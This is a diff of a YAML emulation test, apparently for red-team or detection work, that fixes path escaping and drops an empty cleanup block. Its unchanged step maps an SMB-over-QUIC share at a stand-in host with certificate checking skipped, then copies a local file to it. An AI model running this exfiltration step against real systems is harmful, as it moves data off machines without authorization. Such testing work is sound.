@@ -9,10 +9,10 @@ description: |
 args:
     - name: remote_path
       type: string
-      default: \\example.com\sales
+      default: \\\\example.com\\sales
     - name: local_file
       type: path
-      default: C:\path\to\file.txt
+      default: C:\\path\\to\\file.txt
 uuid: d8d13303-159e-4f33-89f4-9f07812d016f
 mitre:
     tactics:
@@ -29,6 +29,3 @@ steps:
         New-SmbMapping -RemotePath '{{.Args.remote_path}}' -TransportType QUIC -SkipCertificateCheck
         copy '{{.Args.local_file}}' 'Z:\'
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
